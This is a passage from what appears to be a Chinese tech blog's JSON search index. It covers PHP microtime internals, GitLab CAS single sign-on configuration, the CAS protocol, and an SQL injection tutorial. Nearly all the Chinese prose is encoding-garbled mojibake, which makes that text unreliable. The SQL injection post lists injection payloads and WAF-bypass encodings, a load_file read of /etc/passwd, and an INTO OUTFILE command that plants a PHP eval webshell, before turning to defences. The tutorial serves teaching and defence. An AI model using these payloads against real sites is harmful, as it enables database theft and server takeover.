ç”±äºmicrotimeå‡½æ•°è¿”å›çš„æ¯«ç§’éƒ¨åˆ†æ˜¯4ä½ï¼Œgettimeofdayå‡½æ•°è¿”å›çš„æ¯«ç§’éƒ¨åˆ†æ˜¯6ä½ï¼›æ‰€ä»¥ç³»ç»Ÿå¯¹æ—¶é—´ç²¾ç¡®åº¦è¦æ±‚é«˜çš„åœ°æ–¹åº”è¯¥æ³¨æ„ã€‚ #microtimeå‡½æ•°å®ç°12345678910111213141516171819202122232425262728293031323334#ext/standard/microtime.c//åŸå‹PHP_FUNCTION(microtime)&#123; _php_gettimeofday(INTERNAL_FUNCTION_PARAM_PASSTHRU, 0);&#125;//å®ç°static void _php_gettimeofday(INTERNAL_FUNCTION_PARAMETERS, int mode)&#123; zend_bool get_as_float = 0; struct timeval tp = &#123;0&#125;; ZEND_PARSE_PARAMETERS_START(0, 1) Z_PARAM_OPTIONAL Z_PARAM_BOOL(get_as_float) ZEND_PARSE_PARAMETERS_END(); if (gettimeofday(&amp;tp, NULL)) &#123; RETURN_FALSE; &#125; //microtimeå‚æ•°ä¸ºtrue if (get_as_float) &#123; RETURN_DOUBLE((double)(tp.tv_sec + tp.tv_usec / MICRO_IN_SEC)); &#125; if (mode) &#123; //çœç•¥... &#125; else &#123; RETURN_NEW_STR(zend_strpprintf(0, &quot;%.8F %ld&quot;, tp.tv_usec / MICRO_IN_SEC, (long)tp.tv_sec)); &#125;&#125; gettimeofdayå‡½æ•°å¯¹æ¯”å®ç° 1234567891011121314151617181920212223242526272829303132# demo.c#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;sys/time.h&gt;#include&lt;unistd.h&gt;void microtime()&#123; struct timeval tv; struct timezone tz; gettimeofday(&amp;tv, NULL); double php_time; //PHPæ—¶é—´æ ¼å¼ php_time = (double)(tv.tv_sec + tv.tv_usec / 1000000.00); printf(&quot;tv_sec: %ld, tv_usec: %d, php_time: %f\\n&quot;, tv.tv_sec, tv.tv_usec, php_time);&#125;int main()&#123; for (int i = 0; i &lt; 10000; i++) &#123; microtime(); usleep(300); &#125; return 0;&#125; é€šè¿‡äº†è§£microtimeå‡½æ•°çš„å®ç°ï¼Œå…¶å®å¯ä»¥å‘ç°PHPå˜é‡ç±»å‹doubleä¼šè‡ªåŠ¨çœç•¥å°æ•°åé¢çš„0 ç¤ºä¾‹ä»£ç  1234$a = (double) 1.2000;var_dump($a); //è¾“å‡º: float(1.2) #å®RETURN_DOUBLEè¿™é‡Œä¸»è¦äº†è§£ä¸‹PHPæºç ä¸­å‡½æ•°è¿”å›å€¼å¤§éƒ½é‡‡ç”¨å®å‡½æ•°çš„å½¢å¼è¿”å›ï¼Œå¦‚RETURN_DOUBLEç­‰ï¼Œå…·ä½“å®ç°åœ¨zend_API.hå’Œzend_types.hæ–‡ä»¶ä¸­ã€‚ ç®€æ 1å¾…å®š...","categories":[{"name":"php","slug":"php","permalink":"https://ushell.me/categories/php/"}],"tags":[{"name":"microtime","slug":"microtime","permalink":"https://ushell.me/tags/microtime/"}]},{"title":"Gitlabé…ç½®CASè®¤è¯","slug":"Gitlabé…ç½®CASè®¤è¯","date":"2019-05-25T16:00:36.000Z","updated":"2019-05-25T16:00:36.000Z","comments":true,"path":"2019/05/26/Gitlabé…ç½®CASè®¤è¯/","link":"","permalink":"https://ushell.me/2019/05/26/Gitlab%E9%85%8D%E7%BD%AECAS%E8%AE%A4%E8%AF%81/","excerpt":"","text":"Gitlabé‡‡ç”¨Omniauthæ¡†æ¶æ”¯æŒå¤šç§è®¤è¯æ–¹å¼, åœ¨å¼€å‘SSOç³»ç»Ÿè¿‡ç¨‹ä¸­ç¬”è€…é‡‡ç”¨CASè®¤è¯çš„æ–¹å¼æ‰“é€šGitlabç³»ç»Ÿä¸SSO. é‡‡ç”¨CASåè®®è®¤è¯éœ€è¦äº†è§£CASåè®®äº¤äº’è¿‡ç¨‹åŠæ¥å£å¯¹åº”çš„æ•°æ®ç»“æ„ï¼Œå¯å‚è€ƒä¸Šä¸€ç¯‡æ–‡ç« CASåè®® #Gitlabé…ç½® ç¼–è¾‘Gitlabé…ç½®æ–‡ä»¶(/etc/gitlab/gitlab.rb) 123456789101112131415161718192021### OmniAuth Settingsgitlab_rails[&#x27;omniauth_enabled&#x27;] = truegitlab_rails[&#x27;omniauth_allow_single_sign_on&#x27;] = [&#x27;cas3&#x27;]gitlab_rails[&#x27;omniauth_sync_email_from_provider&#x27;] = &#x27;cas3&#x27;gitlab_rails[&#x27;omniauth_sync_profile_from_provider&#x27;] = [&#x27;cas3&#x27;]gitlab_rails[&#x27;omniauth_sync_profile_attributes&#x27;] = [&#x27;email&#x27;]gitlab_rails[&#x27;omniauth_auto_sign_in_with_provider&#x27;] = &#x27;cas3&#x27;gitlab_rails[&#x27;omniauth_block_auto_created_users&#x27;] = falsegitlab_rails[&#x27;omniauth_external_providers&#x27;] = [&#x27;cas3&#x27;]gitlab_rails[&#x27;omniauth_providers&#x27;] = [ &#123; &quot;name&quot; =&gt; &quot;cas3&quot;, #ä½¿ç”¨CAS3åè®® &quot;label&quot;=&gt; &quot;SSO&quot;, #Gitlabç™»é™†é¡µé¢æ˜¾ç¤ºè®¤è¯åç§° &quot;args&quot; =&gt; &#123; &quot;url&quot; =&gt; &quot;http://192.168.0.2:8080&quot;, #SSOåœ°å€ &quot;login_url&quot; =&gt; &quot;/login&quot;, #SSOç™»é™†åœ°å€ &quot;service_validate_url&quot; =&gt; &quot;/verify&quot;, #SSOæˆæƒæ¥å£ &quot;logout_url&quot; =&gt; &quot;/logout&quot; #SSOé€€å‡ºæ¥å£ &#125; &#125;] é‡åŠ è½½é…ç½®æ–‡ä»¶ 1#gitlab-ctl reconfigure é‡å¯æœåŠ¡ 1#gitlab-ctl restart #Gitlab Dockeré…ç½®è¿™é‡Œæ¨èä½¿ç”¨dockeræ­å»ºgitlabæœåŠ¡ä¾¿äºæµ‹è¯• 12345678910111213141516171819202122232425262728#gitlab.ymlversion: &#x27;2&#x27;services: gitlab: image: &#x27;gitlab/gitlab-ce&#x27; restart: always container_name: gitlab environment: TZ: &#x27;Asia/Shanghai&#x27; GITLAB_OMNIBUS_CONFIG: | #external_url &#x27;http://gitlab.example.com&#x27; gitlab_rails[&#x27;omniauth_enabled&#x27;] = true gitlab_rails[&#x27;omniauth_allow_single_sign_on&#x27;] = [&#x27;cas3&#x27;] gitlab_rails[&#x27;omniauth_sync_email_from_provider&#x27;] = &#x27;cas3&#x27; gitlab_rails[&#x27;omniauth_sync_profile_from_provider&#x27;] = [&#x27;cas3&#x27;] gitlab_rails[&#x27;omniauth_sync_profile_attributes&#x27;] = [&#x27;email&#x27;] gitlab_rails[&#x27;omniauth_auto_sign_in_with_provider&#x27;] = &#x27;cas3&#x27; gitlab_rails[&#x27;omniauth_block_auto_created_users&#x27;] = false gitlab_rails[&#x27;omniauth_external_providers&#x27;] = [&#x27;cas3&#x27;] gitlab_rails[&#x27;omniauth_providers&#x27;] = [&#123;&quot;name&quot; =&gt; &quot;cas3&quot;,&quot;label&quot;=&gt; &quot;SSO&quot;,&quot;args&quot; =&gt; &#123;&quot;url&quot; =&gt; &quot;http://192.168.0.2:8080&quot;,&quot;login_url&quot; =&gt; &quot;/login&quot;,&quot;service_validate_url&quot; =&gt; &quot;/verify&quot;,&quot;logout_url&quot; =&gt; &quot;/logout&quot;&#125;&#125;] ports: - &quot;80:80&quot; - &quot;443:443&quot; - &quot;10022:22&quot; volumes: - &#x27;/srv/gitlab/config:/etc/gitlab&#x27; - &#x27;/srv/gitlab/logs:/var/log/gitlab&#x27; - &#x27;/srv/gitlab/data:/var/opt/gitlab&#x27; #å‚è€ƒ [gitlab dockerç¯å¢ƒå˜é‡] https://docs.gitlab.com/omnibus/settings/environment-variables.html [gitlabæ”¯æŒCASè®¤è¯] https://gitlab.com/help/integration/cas.md [gitlabè®¤è¯ç»„ä»¶omniauth] https://docs.gitlab.com/ce/integration/omniauth.html","categories":[{"name":"gitlab","slug":"gitlab","permalink":"https://ushell.me/categories/gitlab/"}],"tags":[{"name":"cas","slug":"cas","permalink":"https://ushell.me/tags/cas/"},{"name":"sso","slug":"sso","permalink":"https://ushell.me/tags/sso/"},{"name":"gitlab","slug":"gitlab","permalink":"https://ushell.me/tags/gitlab/"}]},{"title":"CASåè®®","slug":"CASåè®®","date":"2019-05-25T11:41:19.000Z","updated":"2019-05-25T11:41:19.000Z","comments":true,"path":"2019/05/25/CASåè®®/","link":"","permalink":"https://ushell.me/2019/05/25/CAS%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"CASå…¨ç§°æ˜¯ä¸­å¿ƒè®¤è¯æœåŠ¡(Central Authentication Service), æ˜¯SSOæœåŠ¡ä¸­ä¸€ç§è®¤è¯åè®®, ç›®å‰æœ‰ä¸‰ä¸ªç‰ˆæœ¬1.0, 2.0, 3.0 #CASè®¤è¯æµç¨‹ è®¤è¯è¿‡ç¨‹1ç•¥... :) å¦‚å›¾æ‰€ç¤º #CASåè®®è®¤è¯æ¥å£URI æ¥å£åˆ—è¡¨ 1234567891011121314151. /loginæ¥å£2. /logoutæ¥å£3. /validateæ¥å£ Ticketè®¤è¯æ¥å£ (v1.0)4. /serviceValidateæ¥å£ Ticketè®¤è¯æ¥å£ (v2.0)5. /proxyValidateæ¥å£ Ticketè®¤è¯/ä»£ç†æ¥å£ (v2.0)6. /proxyæ¥å£ ä»£ç†æœåŠ¡æ¥å£ (v2.0)7. /p3/serviceValidateæ¥å£ Ticketè®¤è¯æ¥å£ï¼ˆv3.0ï¼‰8. /p3/proxyValidateæ¥å£ Ticketè®¤è¯/ä»£ç†æ¥å£ (v3.0) æ¥å£æ•°æ®ç»“æ„ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#loginæ¥å£è¯·æ±‚å‚æ•°: service=http://686617c54d47/users/auth/cas3/callback?url=http://127.0.0.1/users/sign_in é€‰å¡«å‚æ•°: renew= gateway= method=å“åº”å‚æ•°: è®¤è¯æˆåŠŸ: 302è·³è½¬åˆ°serviceåœ°å€, é™„å¸¦ticketè®¤è¯æˆåŠŸå‚æ•° è®¤è¯å¤±è´¥: SSOç™»é™†é¡µé¢æç¤ºé”™è¯¯ä¿¡æ¯#logoutæ¥å£v1.0,v2.0ç‰ˆæœ¬: è´¦æˆ·é€€å‡ºæˆåŠŸåæ˜¾ç¤ºæˆåŠŸä¿¡æ¯çš„é¡µé¢v3.0ç‰ˆæœ¬: è¯·æ±‚å‚æ•°ä¸­ä¸å¸¦service, æ˜¾ç¤ºé€€å‡ºæˆåŠŸé¡µé¢ï¼›å‚æ•°ä¸­å¸¦æœ‰serviceï¼Œé€€å‡ºæˆåŠŸåè·³è½¬åˆ°serviceé¡µé¢#validateæ¥å£ (ä¸æ¨èä½¿ç”¨)è¯·æ±‚å‚æ•°: service: ticket: (loginæ—¶è®¤è¯çš„Ticket) renew(é€‰å¡«)å“åº”å‚æ•°: è®¤è¯æˆåŠŸ: yes&lt;LF&gt; è®¤è¯å¤±è´¥: no&lt;LF&gt;#serviceValidateæ¥å£è¯·æ±‚å‚æ•°: service: ticket: (loginæ—¶è®¤è¯çš„Ticket) pgtUrl: (ä»£ç†url, é€‰å¡«) renew: (é€‰å¡«) format: (æœŸå¾…å“åº”ç»“æœæ ¼å¼:xmlæˆ–json, Gitlabé»˜è®¤ä½¿ç”¨XML)å“åº”å‚æ•°: è®¤è¯æˆåŠŸ(xmlæ ¼å¼): &lt;cas:serviceResponse xmlns:cas=&quot;http://www.yale.edu/tp/cas&quot;&gt; &lt;cas:authenticationSuccess&gt; &lt;cas:user&gt;ä¸šåŠ¡å‚æ•°&lt;/cas:user&gt; &lt;cas:attributes&gt; &lt;cas:firstname&gt;ä¸šåŠ¡å‚æ•°&lt;/cas:firstname&gt; &lt;/cas:attributes&gt; &lt;cas:proxyGrantingTicket&gt;æ–°ç”Ÿæˆçš„Ticket&lt;/cas:proxyGrantingTicket&gt; &lt;/cas:authenticationSuccess&gt; &lt;/cas:serviceResponse&gt; è®¤è¯å¤±è´¥(xmlæ ¼å¼): &lt;cas:serviceResponse xmlns:cas=&quot;http://www.yale.edu/tp/cas&quot;&gt; &lt;cas:authenticationFailure code=&quot;INVALID_TICKET&quot;&gt; é”™è¯¯ä¿¡æ¯ &lt;/cas:authenticationFailure&gt; &lt;/cas:serviceResponse&gt;è®¤è¯å¤±è´¥ç›¸å…³çš„é”™è¯¯ç : INVALID_REQUEST | INVALID_TICKET_SPEC | INVALID_TICKET | INVALID_SERVICE | INTERNAL_ERROR #Ticketèº«ä»½ç¥¨æ®ticketæ˜¯è®¤è¯å‘¨æœŸä¸­èº«ä»½å‡­è¯ï¼Œticketå­—ç¬¦ä»…åŒ…å«{A-Z, a-z, 0-9}å’Œâ€-â€œ, å­—ç¬¦é•¿åº¦æœ€å¥½å¤§äº64ä½ 123456789101112131415161718192021222324252627282930serviceç±»å‹Ticket: 1. ç”¨äºæ ¡éªŒlogin serviceå‚æ•°ä¸­çš„åœ°å€ 2. Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;ST-&quot;å¼€å¤´ 3. TicketéªŒè¯æ¬¡æ•°é™åˆ¶ï¼Œæœ‰æ•ˆæœŸç­‰å®‰å…¨æ€§ proxyç±»å‹Ticket: 1. ç”¨äºæ ¡éªŒproxy serviceå‚æ•°ä¸­çš„åœ°å€ 2. Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;PT-&quot;å¼€å¤´ 3. TicketéªŒè¯æ¬¡æ•°é™åˆ¶ï¼Œæœ‰æ•ˆæœŸç­‰å®‰å…¨æ€§ proxy-grantç±»å‹Ticket: 1. å¤šçº§åˆ«proxyä»£ç†ä¸­ä½¿ç”¨ï¼Œéä¸€æ¬¡æ€§ticket 2. Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;PGT-&quot;å¼€å¤´ 3. TicketéªŒè¯æ¬¡æ•°é™åˆ¶ï¼Œæœ‰æ•ˆæœŸç­‰å®‰å…¨æ€§ loginç±»å‹Ticket: 1. ç™»é™†æˆåŠŸåæ ‡å¿—Ticket 2. Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;LT-&quot;å¼€å¤´ ticket-grantingç±»å‹: 1. Verifyè®¤è¯æˆåŠŸåäº§ç”Ÿçš„Ticket 2. Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;TGT-&quot;å¼€å¤´ 3. TicketéªŒè¯æ¬¡æ•°é™åˆ¶ï¼Œæœ‰æ•ˆæœŸç­‰å®‰å…¨æ€§ 4. å°½é‡å†åŠ å¯†ä¸€æ¬¡Ticket ticket-granting cookieç±»å‹: 1. Verifyè®¤è¯æˆåŠŸåäº§ç”Ÿçš„Ticket, ä¿å­˜åœ¨Cookieä¸­(åŒäºŒçº§åŸŸåä¸‹ä½¿ç”¨cookie) 2. Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;TGC-&quot;å¼€å¤´ 3. Cookieè·¯å¾„ä¸¥æ ¼é™åˆ¶ ï¼ˆå¤šç”¨äºåŒäºŒçº§åŸŸåå…¶ä»–ç«™ç‚¹ï¼‰ 4. Cookieä¸­å¯èƒ½åŒ…å«ticket-grantingçš„ticket(ä¸æ¨è) #å‚è€ƒ [CASåè®®ç»†èŠ‚] https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol-Specification.html [CASåè®®åŸç†] https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol.html [CASå®¢æˆ·ç«¯å®ç°] https://apereo.github.io/cas/4.2.x/integration/CAS-Clients.html [CASåŸç†è§£æ] https://juejin.im/post/5a002b536fb9a045132a1727","categories":[{"name":"protocol","slug":"protocol","permalink":"https://ushell.me/categories/protocol/"}],"tags":[{"name":"cas","slug":"cas","permalink":"https://ushell.me/tags/cas/"},{"name":"sso","slug":"sso","permalink":"https://ushell.me/tags/sso/"}]},{"title":"How SQLi ATTACK","slug":"How-SQLi-ATTACK","date":"2018-01-21T08:31:18.000Z","updated":"2018-01-21T08:31:18.000Z","comments":true,"path":"2018/01/21/How-SQLi-ATTACK/","link":"","permalink":"https://ushell.me/2018/01/21/How-SQLi-ATTACK/","excerpt":"","text":"SQLè¯­è¨€æ˜¯å®ç°æ•°æ®åº“æ“ä½œçš„ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œæ•°æ®åº“è§£æå™¨é€šè¿‡è§£æSQLå®ç°å¯¹æ•°æ®çš„å¢åˆ æ”¹æŸ¥ç­‰æ“ä½œã€‚ç›®å‰ä¸»æµæ•°æ®åº“æœ‰MySQLã€Oracleã€MSSQLã€Postgresqlã€MongoDBç­‰ç­‰ã€‚Webæ¶æ„é‡‡ç”¨è„šæœ¬è¯­è¨€+æ•°æ®åº“çš„å½¢å¼æ„å»ºæœåŠ¡ï¼ŒSQLiå°±å‡ºç°åœ¨è„šæœ¬è¯­è¨€é€»è¾‘å¤„ç†ä¸­ã€‚è€ŒSQLi(SQL Injection)æ”»å‡»å·²ç»å»¶ç»­äº†åå¤šå¹´ä¹‹ä¹…ï¼Œå†å¹´å æ®OWASP Top10æ¦œé¦–ã€‚SQLiåœ¨ä¼ ç»Ÿæ¡†æ¶ä¸­å‡ºç°çš„é¢‘ç‡æä¸ºé«˜ï¼Œè€Œç°ä»£å½¢å¼Webæ¡†æ¶ä»åº•å±‚å±è”½äº†SQLiå‡ºç°çš„å¯èƒ½æ€§ã€‚ #SQLåŸºç¡€SQLè¯­è¨€åˆ†ä¸ºDDLã€DMLã€DCLã€TCLç­‰ï¼Œå…¶ä¸­DMLè¯­è¨€æ˜¯ç›®å‰ä½¿ç”¨æœ€é«˜çš„ã€‚DDLè¯­è¨€ï¼ˆData Definition Languageï¼‰ create alter drop truncate comment rename DMLè¯­è¨€(Data Manipulation Language) select insert update delete merge call explain plan lock table DCLè¯­è¨€(Data control language) grant revoke TCLè¯­è¨€(Transcation control language) commit savepoint rollback set transcation ç”±äºæƒé™çš„åŸå› ï¼ŒSQLiå¸¸ä½¿ç”¨çš„DDL+DMLå¯¹ç³»ç»Ÿåç«¯æ•°æ®åº“æ“ä½œã€‚ä¸€ä¸ªåŸºç¡€SQLiçš„äº§ç”Ÿæ˜¯åç«¯ç³»ç»Ÿæœªå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œä½¿ç”¨æˆ·è¾“å…¥æ•°æ®ä¸ä¸šåŠ¡SQLè¯­å¥æ‹¼æ¥ï¼Œå¯¼è‡´äº§ç”Ÿéæ³•æ“ä½œã€‚ 123456789&lt;?php //ä¸šåŠ¡é€»è¾‘ $name = $_GET[&#x27;name&#x27;]; $id = $_GET[&#x27;id&#x27;]; //å­—ç¬¦å‹æ³¨å…¥ $sql = &quot;select * from user where username=&#x27;&#123;$name&#125;&#x27;&quot;; //æ•°å­—å‹æ³¨å…¥ $sql = &quot;select * from user where id = &#x27;&#123;$id&#125;&#x27;&quot;;?&gt; æ”»å‡»Payload 123456789101112131415161718192021222324252627282930313233343536373839404142 http://127.0.0.1/index.php?name=admin&#x27;;select @@version# http://127.0.0.1/index.php?id=1;select @@version#````ä¸€ã€åç«¯æ•°æ®åº“ç§ç±»æ¯•ç«Ÿå¤šï¼Œéœ€è¦è¯†åˆ«æ•°æ®åº“ç±»å‹ï¼Œä¾æ®ä¸åŒæ•°æ®åº“ç‰¹æ€§åŒºåˆ†* @@versionå˜é‡* ç‰¹å®šå‡½æ•° - MySQL =&gt; last_insert_id() - MSSQL =&gt; @@rowcount - Oracle =&gt; BITAND(1,1)* å­—ç¬¦ä¸²æ‹¼æ¥å¤„ç†ä¸åŒ - MySQL/Postgresql =&gt; ç©ºæ ¼æ‹¼æ¥ - MSSQL =&gt; åŠ å·æ‹¼æ¥ - Oracle =&gt; ||ç¬¦åˆæ‹¼æ¥äºŒã€Union/Order byç‰¹æ€§è·å–åˆ—æ•°```php//æŸ¥è¯¢åˆ—è¡¨æ•°ç›®index.php?id=12+select+NULL,NULL,NULL,...//å­—ç¬¦æ˜¾ç¤ºä½index.php?id=12+order+by+1````ä¸‰ã€è·å–æ•°æ®åº“è¡¨å```phpMSSQL:æ•°æ®åº“åï¼šmaster..sysdatabasesselect name from master..sysdatabases;MySQL:æ•°æ®åº“åï¼šinformation_schema.schemataè¡¨åï¼šinformation_schema.tablesæƒé™: information_schema.schema_privilegesè¡¨åï¼šmysql.dbï¼ˆç®¡ç†æƒé™ï¼‰select SCHEMA_NAME from information_schema.schemata;select TABLE_NAME from information_schema.tables;select COLUMN_NAME from information_schema.columns where TABLE_NAME=&#x27;xxx&#x27;;Oracle:ç”¨æˆ·è¡¨: user_tablesè¡¨ï¼šall_tablesæƒé™è¡¨: user_sys_privs è‡³æ­¤ä¸€ä¸ªåŸºç¡€SQLiæ”»å‡»è¿‡ç¨‹å®Œæ¯•ï¼Œåœ¨å¤æ‚çš„ä¸šåŠ¡åœºæ™¯ä¸­ï¼ŒSQLiå¹¶ä¸å±€é™äºselectå½¢å¼çš„æ³¨å…¥ï¼Œè¿˜æœ‰insertã€updateã€deleteç­‰å½¢å¼çš„æ³¨å…¥åœºæ™¯ã€‚ç›¸å¯¹äºselectæ¥è¯´æ›´ä¸ºå¤æ‚ï¼Œä¸å¯è§ã€éš¾æ“ä½œã€‚ INSERTæ³¨å…¥çš„å¥‡æ€å¦™æƒ³ï¼š 123456$sql = &quot;insert into user(username, password)values(&#x27;&quot;.$_GET[name].&quot;&#x27;, password(&#x27;&quot;.$_GET[&#x27;password&#x27;].&quot;&#x27;))&quot;;//PAYLOAD$name = &#x27;x&#x27;,(select @@version)--//å¯æ§ç‚¹æ’å…¥ç‰¹å®šSQLï¼Œå¸¸è§äºä¸ªäººä¿¡æ¯ç¼–å†™ä¸šåŠ¡ä¸­ UPDATEæ³¨å…¥çš„å¥‡æ€å¦™æƒ³: 123$sql = &quot;update user set name=&#x27;&quot; .$_GET[&#x27;name&#x27;]. &quot;&#x27; where id=1&quot;;//æœ¬è´¨ä¸insertç›¸åŒ DELETEæ³¨å…¥çš„å¥‡æ€å¦™æƒ³: 123456$sql = &quot;delete from user where username=&#x27;&#123;$_GET[&#x27;name&#x27;]&#125;&#x27;&quot;;//PAYLOADname=admin&#x27;+union+select+if(current_user()=&#x27;root&#x27;, sleep(3), sleep(10));//è¯¥ç±»å‹æ³¨å…¥æµ‹è¯•ç¹ç SQLæ³¨å…¥è¿˜æœ‰ä¸€ç§ç›²æ³¨çš„åœºæ™¯ï¼Œæ³¨å…¥æ“ä½œä¸ä¼šå›æ˜¾åœ¨é¡µé¢ä¸­ã€‚é€šè¿‡SLEEP/BENCHMARKå‡½æ•°åˆ©ç”¨æ—¶é—´å“åº”çš„ä¸åŒæ¨æ–­æ³¨å…¥ç»“æœã€‚ #SQLç¼–ç ç”±äºWAFï¼ˆweb application firewallï¼‰çš„å‡ºç°ï¼Œçº¯åŸç”Ÿçš„SQLi Payloadä¼šè¢«ç³»ç»Ÿæ‹¦æˆªï¼Œä¸ºäº†bypass wafå°±éœ€è¦å¯¹SQLè¯­å¥è¿›è¡Œå„ç§å˜å½¢ã€‚ å¤§å°å†™ç¼–ç ï¼ˆç›®å‰æ— æ•ˆæœï¼‰ URLENCODEç¼–ç  æ³¨é‡Šç¼–ç  ç‰¹å®šåœºæ™¯å­—ç¬¦æˆªæ–­(å®½å­—èŠ‚æ³¨å…¥) ASCIIç  ç¤ºä¾‹: ```shell#select @@versionindex.php?id=1+uni//on+sel//ect+char(64)+char(64)+char(118)+char(101)+char(114)+char(115)+char(105)+char(110)+char(111)+char(110)#; #/etc/passwdindex.php?id=1+union+select+load_file(0x2F6574632F706173737764)# 1234567891011## #åŸºäºSQLæ”»å‡»å¤§å‚çš„SQLiåœºæ™¯åŸºæœ¬å¤æ‚ï¼Œéœ€è¦é€šè¿‡HTTP/DNS/ICMPç­‰ç­‰æ–¹å¼ï¼Œå°†æ‰§è¡Œç»“æœä¼ é€å‡ºæ¥ï¼›æˆ–è€…åˆ©ç”¨æ•°æ®åº“ç‰¹å®šç½‘ç»œæˆ–æ–‡ä»¶å‡½æ•°å†™å…¥webshellï¼Œè¿›è¡Œåå¼¹è¯·æ±‚ã€‚* OOBæ”»å‡»(out of band)* ç‰¹æ€§å‡½æ•°å†™å…¥æ–‡ä»¶* æ‰§è¡Œå‘½ä»¤ç¤ºä¾‹ï¼š```php//å†™å…¥shellselect &#x27;&lt;?php eval($_REQUEST[&#x27;c&#x27;]);?&gt;&#x27; into outfile &#x27;/var/www/shell.php&#x27;; #SQLiæ¼æ´æŒ–æ˜æŒ–æ˜SQLiæ¼æ´åˆ†ä¸ºé»‘ç›’æ¨¡å¼å’Œç™½ç›’æ¨¡å¼ï¼Œå‰è€…é€šè¿‡å·¥å…·æˆ–æ‰‹å·¥ä¸æ–­æµ‹è¯•ï¼Œåè€…é€šè¿‡é˜…è¯»ä¸šåŠ¡ä»£ç åˆ†æå…·ä½“ä»£ç é€»è¾‘ã€‚æ— è®ºé»‘ç™½ç›’æ¨¡å¼ï¼Œèƒ½å‘ç°é—®é¢˜æ–¹å¼éƒ½æ˜¯å¥½æ–¹å¼ï¼Œå¦‚æœä¸šåŠ¡ä»£ç è¾ƒä¸ºå¤æ‚ï¼Œéœ€è¦å€ŸåŠ©åŠè‡ªåŠ¨åŒ–å·¥å…·è¾…åŠ©åˆ†æä»£ç ã€‚ æºç å®¡è®¡å·¥å…· rips graudit AppScan Source ripså®¡è®¡å·¥å…·ç›®å‰å·²æ›´æ–°ä¸ºå•†ä¸šç‰ˆæœ¬ï¼Œè¿™é‡Œå¯ä»¥ç»“åˆgraduitå·¥å…·è¾…åŠ©æŒ–æ˜SQLiæ¼æ´ï¼›ä»£ç å®¡è®¡çš„æ ¸å¿ƒæ˜¯æ ¹æ®ç¼–ç¨‹è¯­è¨€ç‰¹æ€§å‡½æ•°(æ¼æ´å‡½æ•°)åŠå…¥å£å‚æ•°è¿›è¡Œè¿½æº¯åˆ†æã€‚ #SQLié˜²å¾¡SQLiæ¼æ´å‘ç”ŸåŸå› åœ¨äºè¾“å…¥å‚æ•°ä¸ä¸šåŠ¡SQLç»“åˆå¯¼è‡´å®‰å…¨é£é™©ï¼ŒåŸºç¡€ä¸šåŠ¡æ¥å—çš„å‚æ•°å¤šä¸ºæ•°å­—å‹å’Œå­—ç¬¦å‹ã€‚å¦‚æœå‚æ•°ä¸ºæ•°å­—å‹å‚æ•°ï¼Œå¯é‡‡ç”¨intval()å‡½æ•°å¼ºåˆ¶è½¬æ¢å‚æ•°ä¸ºæ•´å‹ã€‚å¦‚æœå‚æ•°æœªå­—ç¬¦å‹å‚æ•°ï¼Œé€šè¿‡å‚æ•°ç»‘å®šçš„å½¢å¼è§„é¿é£é™©ã€‚ å¸¸è§„é˜²å¾¡æ–¹å¼: intval()/addslashes() PDO/MySQLiå‚æ•°ç»‘å®š æ­£åˆ™è¿‡æ»¤(ä¸ä¸¥è°¨) ä¸‰æ–¹å®‰å…¨ç»„ä»¶ï¼ˆtaint/suhosinï¼‰ RASPæœºåˆ¶(Runtime Application Self Protection) ä¼ ç»Ÿå‹æ¡†æ¶thinkphp/phpcms/dedecms/discuzç­‰æ¡†æ¶åœ¨SQLä½¿ç”¨ä¸Šè¾ƒä¸ºæ··ä¹±ï¼Œç°ä»£å‹æ¡†æ¶Laravel/yii/cakephp/symfonyç­‰æ¡†æ¶åœ¨SQLä¸Šç»Ÿä¸€å°è£…ï¼Œåº•å±‚å¤šä¸ºPDO/MySQLiå‚æ•°ç»‘å®šï¼ŒåŸºæœ¬è§„é¿SQLiçš„é£é™©ã€‚ä½†æ˜¯å„å¤§Webæ¡†æ¶éƒ½æ”¯æŒåŸç”ŸSQLçš„å†™æ³•ï¼ŒSoã€‚ã€‚ã€‚æŒ–ä¸€æŒ–æ€»è¿˜ä¼šæœ‰çš„ :) å‚è€ƒ ã€ŠSQLæ³¨å…¥ä¸é˜²å¾¡ç¬¬äºŒç‰ˆã€‹ ã€ŠSQLå­¦ä¹ æŒ‡å—ç¬¬äºŒç‰ˆã€‹ silicæ³¨å…¥æŒ‡å—(ä¹ ç§‘) MySQL OOBæ”»å‡»","categories":[{"name":"security","slug":"security","permalink":"https://ushell.me/categories/security/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://ushell.me/tags/sqli/"}]}],"categories":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://ushell.me/categories/kubernetes/"},{"name":"tools","slug":"tools","permalink":"https://ushell.me/categories/tools/"},{"name":"docker","slug":"docker","permalink":"https://ushell.me/categories/docker/"},{"name":"php","slug":"php","permalink":"https://ushell.me/categories/php/"},{"name":"network","slug":"network","permalink":"https://ushell.me/categories/network/"},{"name":"gitlab","slug":"gitlab","permalink":"https://ushell.me/categories/gitlab/"},{"name":"protocol","slug":"protocol","permalink":"https://ushell.me/categories/protocol/"},{"name":"security","slug":"security","permalink":"https://ushell.me/categories/security/"}],"tags":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://ushell.me/tags/kubernetes/"},{"name":"synergy","slug":"synergy","permalink":"https://ushell.me/tags/synergy/"},{"name":"å…±äº«é”®é¼ ","slug":"å…±äº«é”®é¼ 